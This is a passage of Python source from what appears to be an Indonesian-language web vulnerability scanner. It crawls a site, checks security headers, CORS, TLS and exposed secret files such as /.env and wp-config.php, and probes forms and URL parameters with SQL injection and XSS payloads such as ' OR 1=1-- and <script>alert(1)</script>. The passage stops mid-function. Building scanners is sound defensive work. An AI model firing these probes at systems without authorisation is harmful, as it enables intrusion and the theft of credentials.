        # pemicu" (mis. SCAN_ERROR), jadi jangan tempelkan bukti apa pun.
        explicit_no_evidence = evidence_url is None
        lookup = self.default_evidence_url if evidence_url is _DEFAULT else evidence_url
        if isinstance(item, Finding):
            finding = item
        else:
            finding = as_finding(item)
        if confidence is not None:
            finding.confidence = finding_confidence(finding.code, confidence)
        if evidence is None and finding.evidence is None and self.capture and not explicit_no_evidence:
            lookup = lookup if lookup is not None else finding.url
            if lookup:
                evidence = evidence_for(lookup)
        if evidence is not None and finding.evidence is None:
            finding.evidence = evidence
        super().append(finding)

    def extend(self, items):
        if isinstance(items, (Finding, tuple)):
            self.append(items)
            return
        for item in items:
            self.append(item)

class ThreadLocalSession:
    """Proxy Session yang membuat curl_cffi Session terpisah per thread.

    Dipakai supaya request bisa diparalelkan tanpa berbagi satu Session antar
    thread. Seluruh request melewati satu funnel (`.request()`), jadi timeout
    default dan retry status HTTP berlaku seragam untuk semua modul tanpa perlu
    mengubah call site. Atribut lain (cookies, headers, close) didelegasikan ke
    Session milik thread terkait lewat __getattr__.
    """

    def __init__(self, timeout=15, verify_ssl=True, impersonate=_DEFAULT, retries=None):
        self._local = threading.local()
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.impersonate = impersonate
        self.retries = STATUS_RETRIES if retries is None else max(0, retries)

    def _session(self):
        sess = getattr(self._local, "sess", None)
        if sess is None:
            sess = make_session(timeout=self.timeout, verify_ssl=self.verify_ssl,
                                impersonate=self.impersonate)
            self._local.sess = sess
        return sess

    def request(self, method, url, **kwargs):
        """Kirim request dengan timeout default + retry status HTTP transparan.

        curl_cffi hanya me-retry error transport; retry untuk status 429/5xx
        (perilaku lama dari urllib3.Retry) dibuat ulang di sini, termasuk
        menghormati header Retry-After, supaya cakupan modul tidak berkurang.
        """
        kwargs.setdefault("timeout", self.timeout)
        method = method.upper()
        max_attempts = self.retries if method in RETRY_METHODS else 0
        started = time.monotonic()
        resp = None
        for attempt in range(max_attempts + 1):
            resp = self._session().request(method, url, **kwargs)
            if resp.status_code not in RETRY_STATUS or attempt >= max_attempts:
                break
            time.sleep(_retry_after_seconds(resp.headers.get("Retry-After")))
        # Bukti direkam di satu-satunya funnel request, termasuk respons 4xx/5xx,
        # supaya setiap temuan punya request/response pendukungnya.
        record_exchange(exchange_from_response(resp, method, (time.monotonic() - started) * 1000,
                                               kwargs, session_cookies=self._cookie_items()))
        return resp

    def _cookie_items(self):
        """Isi cookie jar session thread ini, atau None kalau tidak tersedia.

        Dipakai hanya untuk menambah header Cookie ke bukti; kegagalan di sini
        tidak boleh menggagalkan request yang sudah berhasil.
        """
        try:
            return list(self._session().cookies.items())
        except Exception:
            return None

    def get(self, url, **kwargs):     return self.request("GET", url, **kwargs)
    def post(self, url, **kwargs):    return self.request("POST", url, **kwargs)
    def put(self, url, **kwargs):     return self.request("PUT", url, **kwargs)
    def patch(self, url, **kwargs):   return self.request("PATCH", url, **kwargs)
    def delete(self, url, **kwargs):  return self.request("DELETE", url, **kwargs)
    def head(self, url, **kwargs):    return self.request("HEAD", url, **kwargs)
    def options(self, url, **kwargs): return self.request("OPTIONS", url, **kwargs)

    def __getattr__(self, name):
        return getattr(self._session(), name)


REQUEST_EXECUTOR = None
DEFAULT_WORKERS = 10


def set_request_executor(workers):
    """Batasi total request paralel untuk seluruh modul."""
    global REQUEST_EXECUTOR
    if REQUEST_EXECUTOR is not None:
        REQUEST_EXECUTOR.shutdown(wait=False)
        REQUEST_EXECUTOR = None
    if workers and workers > 1:
        REQUEST_EXECUTOR = ThreadPoolExecutor(max_workers=workers, thread_name_prefix="spade-req")


def pmap(fn, items, workers=None):
    """Map paralel dengan worker global yang sama untuk semua modul."""
    items = list(items)
    if not items:
        return []
    if REQUEST_EXECUTOR is None or (workers is not None and workers <= 1):
        return [fn(x) for x in items]
    return list(REQUEST_EXECUTOR.map(fn, items))

def pmap_until(fn, items):
    """Map paralel, berhenti lebih awal begitu ada hasil yang truthy.

    Dipakai modul deteksi (SQLi/XSS/CMDi/...) supaya job sisa tidak ikut
    dieksekusi setelah satu temuan ditemukan. Ini penghemat besar di mode
    DETAILED karena jumlah payload × parameter bisa ratusan request.
    """
    items = list(items)
    if not items:
        return None
    if REQUEST_EXECUTOR is None:
        for x in items:
            out = fn(x)
            if out:
                return out
        return None
    stop = threading.Event()

    def _wrapped(x):
        if stop.is_set():
            return None
        out = fn(x)
        if out:
            stop.set()
        return out

    futures = [REQUEST_EXECUTOR.submit(_wrapped, x) for x in items]
    try:
        for fut in as_completed(futures):
            out = fut.result()
            if out:
                stop.set()
                for other in futures:
                    other.cancel()
                return out
    except Exception:
        pass
    finally:
        stop.set()
    return None

# ── HTML form parser ──
class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self._cur = None; self._ta = False
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action",""), "method": a.get("method","get").upper(), "inputs": []}
        elif tag in ("input","textarea") and self._cur:
            if tag == "textarea": self._ta = True
            self._cur["inputs"].append({"name": a.get("name",""), "type": a.get("type","text"), "value": a.get("value","")})
        elif tag == "select" and self._cur:
            self._cur["inputs"].append({"name": a.get("name",""), "type": "select", "value": ""})
    def handle_endtag(self, tag):
        if tag == "form" and self._cur: self.forms.append(self._cur); self._cur = None
        elif tag == "textarea": self._ta = False
    def handle_data(self, data):
        if self._ta and self._cur and self._cur["inputs"]:
            inp = self._cur["inputs"][-1]
            if not inp["value"]: inp["value"] = data.strip()

# ── crawler ──
class Crawler:
    def __init__(self, sess, base_url, depth=1, max_p=30):
        self.sess = sess; self.base = base_url.rstrip("/")
        self.netloc = urllib.parse.urlparse(base_url).netloc
        self.depth = depth; self.max_p = max_p
        self.visited = set(); self.pages = {}
    def _norm(self, url):
        p = urllib.parse.urlparse(url)
        return f"{p.scheme}://{p.netloc}{p.path.rstrip('/') or '/'}"
    def _internal(self, url): return urllib.parse.urlparse(url).netloc == self.netloc
    def crawl(self, seed_text=None):
        """BFS per level, fetch semua halaman di level yang sama secara paralel.

        seed_text dipakai kalau halaman root sudah di-fetch modul lain, supaya
        tidak request base URL dua kali.
        """
        level = [self.base]
        self.visited.add(self._norm(self.base))
        if seed_text is not None:
            self.pages[self.base] = seed_text
            level = []
            for m in re.finditer(r'href=["\'](.*?)["\']', seed_text, re.I):
                full = urllib.parse.urljoin(self.base, m.group(1)).split("#")[0]
                n = self._norm(full)
                if self._internal(full) and n not in self.visited:
                    if not any(n.lower().endswith(e) for e in (".pdf",".zip",".png",".jpg",".gif",".css",".js",".svg",".ico")):
                        self.visited.add(n); level.append(n)

        start_depth = 1 if seed_text is not None else 0
        for d in range(start_depth, self.depth + 1):
            if not level:
                break
            # Batasi jumlah halaman sesuai max_p
            remaining = self.max_p - len(self.pages)
            if remaining <= 0:
                break
            batch = level[:remaining]

            def _fetch(u):
                try:
                    r = self.sess.get(u, timeout=10)
                    if r.status_code == 200:
                        return u, r.text
                except: pass
                return u, None

            next_level = []
            for u, text in pmap(_fetch, batch):
                if text is None:
                    continue
                self.pages[u] = text
                if d < self.depth:
                    for m in re.finditer(r'href=["\'](.*?)["\']', text, re.I):
                        full = urllib.parse.urljoin(u, m.group(1)).split("#")[0]
                        n = self._norm(full)
                        if self._internal(full) and n not in self.visited:
                            if not any(n.lower().endswith(e) for e in (".pdf",".zip",".png",".jpg",".gif",".css",".js",".svg",".ico")):
                                self.visited.add(n); next_level.append(n)
            level = next_level
        return self.pages
    def get_forms(self):
        forms = []
        for url, html in self.pages.items():
            p = FormParser(); p.feed(html)
            for f in p.forms:
                a = urllib.parse.urljoin(url, f["action"]) if f["action"] else url
                forms.append((a, f["method"], f["inputs"], url))
        return forms

def get_forms(ctx):
    """Parse form satu kali saja, lalu pakai ulang di semua modul."""
    crawler = ctx.get("crawler") if ctx else None
    if not crawler or not crawler.pages:
        return []
    return ctx_get(ctx, ("forms", id(crawler)), crawler.get_forms)

def is_echo_endpoint(sess, url, timeout=8):
    """Probe endpoint — kalau ngulangin input mentah, skip buat ngurangin false positive."""
    probe = "__xechoprobe__" + str(int(time.time()))
    try:
        r = sess.get(url, params={"q": probe}, timeout=timeout)
        return probe in r.text
    except: return False

def echo_skip(sess, url, ctx=None):
    """Cache hasil is_echo_endpoint supaya tidak diprobe berulang di tiap modul."""
    return ctx_get(ctx, ("echo", url), lambda: is_echo_endpoint(sess, url))

# ══════════════════════════════════════════════════════════════════
# SCAN FUNCTIONS — setiap finding pakai deskripsi jelas
# ══════════════════════════════════════════════════════════════════


def get_baseline_fingerprint(sess, base_url):
    """Probe 2 random non-existent paths untuk deteksi SPA catch-all / default page.
    Mengembalikan dict fingerprint atau None jika server handle 404 dengan benar."""
    import random
    import string
    timeout = 8  # max detik per probe
    info("Membangun baseline untuk deteksi false positive...")
    probes = []
    seen = set()
    for i in range(2):
        # Hindari path duplikat
        while True:
            rand = ''.join(random.choices(string.ascii_lowercase, k=10))
            if rand not in seen:
                seen.add(rand)
                break
        path = '/_spade_probe_' + rand + '.html'
        try:
            r = sess.get(join(base_url, path), timeout=timeout)
            probes.append({
                'status': r.status_code,
                'size': len(r.content),
                'content': r.content,
                'content_type': r.headers.get('Content-Type', ''),
                'is_html': bool(b'<!DOCTYPE html' in r.content[:200] or b'<html' in r.content[:200]),
            })
        except:
            pass

    if len(probes) < 2:
        info(f'  Baseline: hanya {len(probes)} probe berhasil (mungkin koneksi terblokir)')
        return None

    # Cek konsistensi: kalo semua probe return 200 dengan content yang sama -> SPA catch-all
    all_200 = all(p['status'] == 200 for p in probes)
    same_size = probes[0]['size'] == probes[1]['size']
    same_content = probes[0]['content'] == probes[1]['content']

    if all_200 and same_size and (same_content or probes[0]['is_html']):
        info(f'  SPA catch-all terdeteksi (baseline: {probes[0]["size"]}B, {probes[0]["content_type"]})')
        return {
            'detected': 'spa_catchall',
            'content': probes[0]['content'],
            'size': probes[0]['size'],
            'content_hash': hash(probes[0]['content']),
            'content_type': probes[0]['content_type'],
            'is_html': probes[0]['is_html'],
        }

    # Kalo server return 404/403 untuk path random -> handle normal
    if all(p['status'] in (403, 404) for p in probes):
        info('  Server handle non-existent paths dengan benar (404/403)')
        return {'detected': 'proper_404'}

    info(f'  Status probes: {[p["status"] for p in probes]}, sizes: {[p["size"] for p in probes]}')
    return None



def sec_headers(sess, base_url, ctx=None):
    """Cek HTTP security headers + info server + cookie."""
    f = FindingList(base_url)
    r = get_base_response(sess, base_url, ctx)
    try:
        h = r.headers

        # Security headers checklist
        checks = [
            ("Strict-Transport-Security", "MEDIUM", "HSTS (HTTP Strict Transport Security) tidak diset. Koneksi HTTP tidak otomatis ditingkatkan ke HTTPS — risiko downgrade attack."),
            ("Content-Security-Policy", "MEDIUM", "CSP (Content Security Policy) tidak diset. Browser tidak dilindungi dari XSS via inline script atau sumber konten tidak terpercaya."),
            ("X-Content-Type-Options", "LOW", "X-Content-Type-Options: nosniff tidak diset. Browser bisa MIME-type sniffing — risiko eksekusi file non-script sebagai script."),
            ("X-Frame-Options", "MEDIUM", "X-Frame-Options tidak diset. Website bisa di-embed di iframe — risiko clickjacking."),
            ("Referrer-Policy", "LOW", "Referrer-Policy tidak diset. URL lengkap (termasuk parameter sensitif) bisa bocor ke pihak ketiga via header Referer."),
            ("Permissions-Policy", "LOW", "Permissions-Policy tidak diset. Fitur browser (kamera, mikrofon, lokasi) bisa diakses tanpa batasan oleh script pihak ketiga."),
        ]
        for hdr, sev, desc in checks:
            val = h.get(hdr)
            if val:
                good(f"{hdr}: {val[:70]}")
                f.append(("INFO", f"HDR_{hdr.upper().replace('-','_')}", f"{hdr}: {val[:70]}"))
            else:
                warn(f"{hdr} tidak diset")
                f.append((sev, f"MISS_{hdr.upper().replace('-','_')}", desc))

        # Server banner leak
        srv = h.get("Server")
        if srv:
            warn(f"Server: {srv}")
            f.append(("LOW","SERVER_LEAK",f"Header Server membocorkan versi: {srv}. Attacker bisa cari CVE spesifik untuk versi tersebut."))

        # X-Powered-By leak
        xp = h.get("X-Powered-By")
        if xp:
            warn(f"X-Powered-By: {xp}")
            f.append(("LOW","XPOWERED_LEAK",f"Header X-Powered-By membocorkan teknologi backend: {xp}."))

        # CORS
        cors = h.get("Access-Control-Allow-Origin")
        if cors == "*":
            warn("CORS: akses dari origin mana pun diizinkan")
            f.append(("MEDIUM","CORS_WILDCARD","Access-Control-Allow-Origin: * — semua domain bisa membaca respons via JavaScript. Risiko data leakage jika halaman mengandung konten privat."))

        # Cookie security check
        ck = h.get("Set-Cookie","")
        if ck:
            issues = []
            if "Secure" not in ck: issues.append("Secure")
            if "HttpOnly" not in ck: issues.append("HttpOnly")
            if "SameSite" not in ck: issues.append("SameSite")
            if issues:
                warn(f"Cookie: tidak ada flag {', '.join(issues)}")
                desc = "Cookie tidak memiliki flag "
                if "Secure" in issues: desc += "Secure (bisa dikirim lewat HTTP), "
                if "HttpOnly" in issues: desc += "HttpOnly (bisa diakses JavaScript/XSS), "
                if "SameSite" in issues: desc += "SameSite (rentan CSRF), "
                f.append(("LOW","COOKIE_ISSUE",desc.rstrip(", ")+"."))
    except: pass
    return f

def tech_finger(sess, base_url, ctx=None):
    """Deteksi teknologi dari header dan HTML."""
    f = FindingList(base_url); info("Mendeteksi teknologi website...")
    r = get_base_response(sess, base_url, ctx)
    try:
        techs = []
        srv = r.headers.get("Server")
        if srv: techs.append(srv)
        xp = r.headers.get("X-Powered-By")
        if xp: techs.append(xp)
        b = r.text
        if re.search(r'wp-content|wp-includes|wordpress',b,re.I): techs.append("WordPress")
        if 'laravel' in b.lower() or 'livewire' in b.lower(): techs.append("Laravel")
        if 'jquery' in b.lower(): techs.append("jQuery")
        if 'react' in b.lower() or 'react-dom' in b.lower(): techs.append("React")
        if 'vue' in b.lower(): techs.append("Vue.js")
        if techs:
            info(f"Terdeteksi: {', '.join(techs)}")
            f.append(("INFO","TECH","Teknologi terdeteksi: "+', '.join(techs)))
        else:
            info("Tidak ada teknologi yang teridentifikasi secara jelas")
    except: pass
    return f

def robots_txt(sess, base_url, ctx=None):
    """Analisis robots.txt."""
    f = FindingList(join(base_url, "/robots.txt"))
    try:
        r = sess.get(join(base_url,"/robots.txt"), timeout=10)
        if r.status_code==200 and "Disallow" in r.text:
            d = re.findall(r"Disallow:\s*(\S+)",r.text,re.I)
            if d:
                warn(f"robots.txt melarang akses ke: {d[:10]}")
                f.append(("INFO","ROBOTS",f"robots.txt berisi {len(d)} aturan Disallow. Path yang diblokir: {d[:8]}. Kadang mengungkap endpoint admin atau path sensitif."))
    except: pass
    return f

def sensitive_files(sess, base_url, ctx=None):
    """Cari file sensitif yang terekspos publik."""
    baseline = ctx.get("baseline") if ctx else None
    if baseline is None:
        baseline = get_baseline_fingerprint(sess, base_url)
        if ctx is not None:
            ctx["baseline"] = baseline

    paths = [("/.env","File env (variabel lingkungan) — bisa berisi database password, API key, secret key aplikasi."),
             ("/.git/config","Konfigurasi Git — ekspos source code dan riwayat commit."),
             ("/.git/HEAD","HEAD Git — konfirmasi repositori Git terekspos."),
             ("/.svn/entries","File SVN — ekspos struktur direktori source code."),
             ("/.htpasswd","File htpasswd — berisi kredensial terenkripsi untuk akses terbatas."),
             ("/dump.sql","Dump database SQL — bisa berisi semua data website."),
             ("/db.sql","File SQL — kemungkinan berisi struktur dan data database."),
             ("/phpinfo.php","phpinfo() — informasi konfigurasi PHP lengkap, termasuk path, variabel lingkungan, dan ekstensi."),
             ("/info.php","phpinfo() — informasi konfigurasi PHP lengkap."),
             ("/wp-config.php","Konfigurasi WordPress — berisi kredensial database, secret keys."),
             ("/config.php","File konfigurasi PHP umum."),
             ("/config.php.bak","Backup file konfigurasi — versi lama mungkin tidak aman."),
             ("/admin/","Halaman admin — panel administrasi website."),
             ("/backup/","Direktori backup — mungkin berisi file sensitif."),
             ("/actuator/health","Spring Boot Actuator health endpoint — informasi kesehatan aplikasi."),
             ("/actuator/info","Spring Boot Actuator info — informasi aplikasi (build, git, env)."),
             ("/swagger-ui.html","Dokumentasi API Swagger — bisa mengungkap endpoint dan parameter API."),
             ("/.env.bak","Backup file env."),
             ("/.env.local","File env local."),
             ("/.env.production","File env production."),
             ("/.env.dev","File env development."),
             ("/storage/logs/laravel.log","Laravel log — bisa berisi stack trace, query, data sensitif.")]

    f = FindingList(); info("Mencari file sensitif...")

    def _is_false_positive(r, path):
        """Cek apakah response adalah SPA catch-all / default page, bukan file asli."""
        if baseline is None or baseline.get("detected") != "spa_catchall":
            return False
        if hash(r.content) == baseline["content_hash"]:
            return True
        if baseline["is_html"] and len(r.content) == baseline["size"]:
            return True
        return False

    def _is_likely_real_env(content):
        """Cek apakah konten benar-benar file .env (bukan HTML page)."""
        text = content[:3000].decode("utf-8", errors="replace")
        keyval_lines = sum(1 for line in text.split("\n") if "=" in line and not line.strip().startswith("#"))
        is_plain = not ("<!" in text[:200] or "<html" in text[:500].lower())
        return is_plain and keyval_lines >= 2

    def _is_likely_real_git_config(content):
        """Cek apakah konten benar-benar .git/config."""
        text = content[:2000].decode("utf-8", errors="replace")
        return "[core]" in text or "repositoryformatversion" in text

    def _is_likely_real_sql_dump(content):
        """Cek apakah konten benar-benar file SQL dump."""
        text = content[:2000].decode("utf-8", errors="replace").lower()
        return any(p in text for p in ["create table", "insert into", "drop table", "create database"])

    def _is_likely_real_phpinfo(content):
        """Cek apakah konten benar-benar hasil phpinfo()."""
        text = content[:2000].decode("utf-8", errors="replace")
        return "phpinfo()" in text or "PHP Version" in text or "php.ini" in text

    def _is_likely_real_admin(content):
        """Cek apakah konten halaman admin (bukan SPA catch-all)."""
        if baseline and baseline.get("detected") == "spa_catchall":
            if hash(content) == baseline["content_hash"]:
                return False
        text = content[:3000].decode("utf-8", errors="replace").lower()
        return any(p in text for p in ["login", "username", "password", "sign in", "dashboard"])

    def _check(item):
        """Periksa satu path. Return (findings, log_lines)."""
        p, desc = item
        out = FindingList(); logs = []
        try:
            r = sess.get(join(base_url, p), timeout=8)
            if r.status_code==200 and len(r.content)>0 and r.url.rstrip("/")!=base_url.rstrip("/"):
                # Skip SPA catch-all
                if _is_false_positive(r, p):
                    logs.append(f"  {p} -> (false positive — SPA catch-all)")
                    return out, logs

                size = len(r.content)

                if any(k in p for k in [".env"]):
                    if _is_likely_real_env(r.content):
                        logs.append(f"!CRIT!File .env terekspos: {p} ({size} bytes)")
                        out.append(("CRITICAL","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))
                    else:
                        logs.append(f"  {p} -> {size}B (bukan .env asli — konten tidak mengandung KEY=VALUE)")

                elif any(k in p for k in [".git"]):
                    if _is_likely_real_git_config(r.content):
                        logs.append(f"!CRIT!File Git terekspos: {p} ({size} bytes)")
                        out.append(("CRITICAL","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))
                    else:
                        logs.append(f"  {p} -> {size}B (bukan file Git asli)")

                elif any(k in p for k in ["dump.sql","db.sql"]):
                    if _is_likely_real_sql_dump(r.content):
                        logs.append(f"!CRIT!File SQL terekspos: {p} ({size} bytes)")
                        out.append(("CRITICAL","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))
                    else:
                        logs.append(f"  {p} -> {size}B (bukan SQL dump asli)")

                elif ".svn" in p:
                    logs.append(f"!CRIT!File SVN terekspos: {p} ({size} bytes)")
                    out.append(("CRITICAL","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))

                elif ".htpasswd" in p:
                    logs.append(f"!CRIT!File htpasswd terekspos: {p} ({size} bytes)")
                    out.append(("CRITICAL","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))

                elif "phpinfo" in p or "info.php" in p:
                    if _is_likely_real_phpinfo(r.content):
                        logs.append(f"!CRIT!PHP info publik: {p} ({size} bytes)")
                        out.append(("HIGH","PHP_INFO",f"File {p} ({size}B) mengekspos konfigurasi PHP lengkap. {desc}", r.url))
                    else:
                        logs.append(f"  {p} -> {size}B (bukan phpinfo asli)")

                elif p in ("/admin/", "/backup/"):
                    if _is_likely_real_admin(r.content):
                        logs.append(f"!WARN!Halaman admin/backup: {p} ({size} bytes)")
                        out.append(("MEDIUM","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))
                    else:
                        logs.append(f"  {p} -> {size}B (SPA catch-all, bukan halaman admin asli)")

                elif "actuator" in p:
                    logs.append(f"!WARN!Actuator endpoint publik: {p} ({size} bytes)")
                    out.append(("MEDIUM","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))

                else:
                    # Generic check dengan baseline
                    logs.append(f"!WARN!File terakses: {p} ({size} bytes)")
                    out.append(("MEDIUM","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}", r.url))

            elif r.status_code==403:
                logs.append(f"{p} -> 403 (terproteksi)")
        except: pass
        return out, logs

    results = pmap(_check, paths)
    for out, logs in results:
        f.extend(out)
        for line in logs:
            if line.startswith("!CRIT!"): critical(line[6:])
            elif line.startswith("!WARN!"): warn(line[6:])
            else: info(line)
    return f

def dir_listing(sess, base_url, ctx=None):
    """Cek directory listing."""
    dirs = [("/images/","direktori gambar"),("/uploads/","direktori upload"),("/backup/","direktori backup"),
            ("/admin/","direktori admin"),("/assets/","direktori assets"),("/files/","direktori file"),
            ("/css/","direktori CSS"),("/js/","direktori JS")]
    f = FindingList(); info("Mengecek directory listing...")
    baseline = ctx.get("baseline") if ctx else None

    def _check(item):
        d, label = item
        out = FindingList()
        try:
            r = sess.get(join(base_url, d), timeout=8)
            if r.status_code==200:
                # Skip SPA catch-all
                if baseline and baseline.get("detected") == "spa_catchall":
                    if hash(r.content) == baseline["content_hash"]:
                        return out
                    if baseline["is_html"] and len(r.content) == baseline["size"]:
                        return out
                t = r.text.lower()
                if "index of" in t or "parent directory" in t:
                    out.append(("HIGH","DIR_LISTING",f"Direktori {d} mengaktifkan directory listing. Siapa pun bisa melihat daftar lengkap file di direktori ini, termasuk file non-publik.", r.url))
        except: pass
        return out

    for out in pmap(_check, dirs):
        for item in out:
            critical(f"Directory listing aktif: {urllib.parse.urlparse(item[3] or '').path}")
            f.append(item)
    return f

def http_methods(sess, base_url, ctx=None):
    f = FindingList(); info("Memeriksa metode HTTP...")
    def _check(m):
        out = FindingList()
        try:
            r = sess.request(m, base_url, timeout=8)
            # Bukti diambil per metode: TRACE/OPTIONS menembak URL yang sama,
            # jadi lookup longgar bisa menempelkan respons metode lain.
            proof = evidence_for(r.url, m)
            if m=="OPTIONS":
                a = r.headers.get("Allow","")
                if a and ("PUT" in a.upper() or "DELETE" in a.upper()):
                    out.append(("HIGH","HTTP_METHOD",f"Server mengizinkan metode PUT/DELETE: {a}. PUT bisa dipakai unggah file berbahaya, DELETE bisa hapus resource.", None),
                               evidence=proof)
            if m=="TRACE" and r.status_code==200:
                out.append(("MEDIUM","TRACE_ENABLED","Metode HTTP TRACE aktif. Bisa dieksploitasi untuk Cross-Site Tracing (XST) — mencuri cookie HttpOnly via JavaScript.", None),
                           evidence=proof)
        except: pass
        return out

    results = pmap(_check, ["PUT","DELETE","TRACE","OPTIONS"])
    for out in results:
        for item in out:
            if item[1] == "HTTP_METHOD":
                critical("Metode berbahaya diizinkan di target")
            else:
                critical("Metode TRACE aktif")
            f.append(item)
    return f

def cors_check(sess, base_url, ctx=None):
    f = FindingList(base_url)
    try:
        r = sess.get(base_url, headers={"Origin":"https://evil.com","Host":host_from_url(base_url)}, timeout=10)
        acao = r.headers.get("Access-Control-Allow-Origin")
        acac = r.headers.get("Access-Control-Allow-Credentials")
        if acao=="*" and acac=="true":
            critical("CORS: Access-Control-Allow-Origin: * dengan Allow-Credentials: true")
            f.append(("HIGH","CORS_WILDCARD_CRED","CORS dikonfigurasi dengan Access-Control-Allow-Origin: * DAN Access-Control-Allow-Credentials: true. Ini memungkinkan situs jahat membaca respons yang memuat kredensial pengguna (cookie, token) via JavaScript."))
        elif acao=="https://evil.com":
            warn("CORS: Access-Control-Allow-Origin mencerminkan origin permintaan")
            f.append(("MEDIUM","CORS_REFLECT","CORS mengembalikan nilai Access-Control-Allow-Origin yang sama dengan origin permintaan. Attacker bisa membuat halaman yang membaca data dari situs ini via JavaScript."))
        elif acao=="*":
            warn("CORS: semua origin diizinkan")
            f.append(("MEDIUM","CORS_WILDCARD","Access-Control-Allow-Origin: *. Semua situs bisa membaca respons via JavaScript. Risiko kebocoran data."))
    except: pass
    return f

def tls_ssl(sess, base_url, ctx=None):
    # Pemeriksaan TLS memakai socket, bukan HTTP: tidak ada exchange untuk dijadikan bukti.
    f = FindingList(capture=False); host = host_from_url(base_url)
    if scheme_from_url(base_url)!="https": return f
    info("Memeriksa TLS/SSL...")
    try:
        ctx = ssl.create_default_context(); ctx.check_hostname=True; ctx.verify_mode=ssl.CERT_REQUIRED
        with socket.create_connection((host,443),timeout=10) as sock:
            with ctx.wrap_socket(sock,server_hostname=host) as ss:
                cert = ss.getpeercert()
                if cert:
                    nb = cert.get("notBefore",""); na = cert.get("notAfter","")
                    good(f"Sertifikat berlaku: {nb} s.d. {na}")
                    try:
                        exp = datetime.strptime(na, "%b %d %H:%M:%S %Y %Z")
                        days = (exp - datetime.now()).days
                        if days<30:
                            critical(f"Sertifikat akan kedaluwarsa dalam {days} hari!")
                            f.append(("HIGH","TLS_EXPIRING",f"Sertifikat SSL/TLS kedaluwarsa dalam {days} hari. Browser akan menampilkan peringatan keamanan kepada pengunjung setelah kedaluwarsa."))
                        elif days<90:
                            warn(f"Sertifikat akan kedaluwarsa dalam {days} hari")
                            f.append(("MEDIUM","TLS_EXP_SOON",f"Sertifikat SSL/TLS kedaluwarsa dalam {days} hari. Perpanjang segera untuk menghindari gangguan."))
                        else: good(f"Sertifikat berlaku {days} hari lagi")
                    except: pass
    except ssl.SSLCertVerificationError as e:
        warn(f"SSL cert: {e}")
        f.append(("HIGH","TLS_CERT_ERR",f"Verifikasi sertifikat gagal: {e}. Pengunjung akan melihat peringatan keamanan."))
    except Exception as e:
        warn(f"TLS error: {e}")
    for pn,pv in [("TLSv1.0",ssl.TLSVersion.TLSv1),("TLSv1.1",ssl.TLSVersion.TLSv1_1)]:
        try:
            ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx2.minimum_version=pv; ctx2.maximum_version=pv
            ctx2.check_hostname=False; ctx2.verify_mode=ssl.CERT_NONE
            with socket.create_connection((host,443),timeout=5) as sock:
                with ctx2.wrap_socket(sock,server_hostname=host) as _:
                    critical(f"Protokol usang didukung: {pn}")
                    f.append(("HIGH",f"WEAK_{pn.replace('.','_')}",f"Server mendukung {pn}. Protokol ini sudah tidak aman dan rentan terhadap serangan seperti POODLE, BEAST. Nonaktifkan dan gunakan minimal TLSv1.2."))
        except: pass
    return f

def scan_sqli(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji SQL injection...")
    if echo_skip(sess, base_url, ctx):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    forms = get_forms(ctx)
    payloads = [("'","petik tunggal"),("' OR '1'='1","OR true"),("' OR 1=1--","OR true komentar"),
                ("' UNION SELECT NULL--","UNION"),("' AND SLEEP(3)--","time-based")]
    errs = ["sql","mysql","syntax error","unclosed quotation","odbc","driver","warning: mysql","pg_query","sqlite","ora-"]
    tested = [0]
    # Cek URL params
    def _check_url(p):
        for payload, label in payloads:
            try:
                r = sess.get(base_url, params={p: payload}, timeout=10)
                if any(e in r.text.lower() for e in errs) and len(r.text)<50000:
                    return [("HIGH","SQLI",f"Parameter URL '{p}' rentan SQL injection (error-based, payload: {label}). Attacker bisa membaca/mengubah database. URL: {base_url}?{p}={payload[:30]}", f"{base_url}?{p}={payload[:30]}", f"SQL injection via parameter '{p}' dengan payload '{label}'")]
            except: pass
        return []
    out = pmap_until(_check_url, ["id","page","p","q","cat","user","uid"])
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
    # Cek form params
    def _check_form(job):
        action, method, inputs, page, inp = job
        # List biasa: tuple di sini membawa pesan log ke-5 yang tidak dipakai Finding.
        out = []
        for payload, label in payloads:
            try:
                p = {inp["name"]: payload}
                url = join(base_url, action)
                r = sess.get(url, params=p, timeout=10) if method=="GET" else sess.post(url, data=p, timeout=10)
                if any(e in r.text.lower() for e in errs) and len(r.text)<50000:
                    out.append(("HIGH","SQLI",f"Form field '{inp['name']}' di {action} rentan SQL injection (error-based, payload: {label}). Attacker bisa membaca/mengubah database.", action, f"SQL injection via field '{inp['name']}' di form {action}"))
                    break
            except: pass
        return out
    jobs = []
    for action,method,inputs,page in forms:
        for inp in inputs:
            if inp["type"] in ("text","search","textarea","hidden","") and inp["name"]:
                jobs.append((action, method, inputs, page, inp))
    tested[0] = len(jobs)
    if jobs:
        out = pmap_until(_check_form, jobs)
        if out:
            for sev, code, desc, url, msg in out:
                critical(msg)
                f.append((sev, code, desc, url), evidence_url=url)
    info(f"SQLi: {tested[0]} parameter diuji")
    return f

def scan_xss(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji XSS...")
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        '"><script>alert(1)</script>',
        "javascript:alert(1)",
    ]
    params = ["q","s","search","query","id","page","name","text","term","keyword","msg","message","subject","comment"]
    
    # ── Reflected XSS via GET ──
    def _check_get(job):
        p, payload = job
        try:
            r = sess.get(base_url, params={p: payload}, timeout=10)
            if payload in r.text:
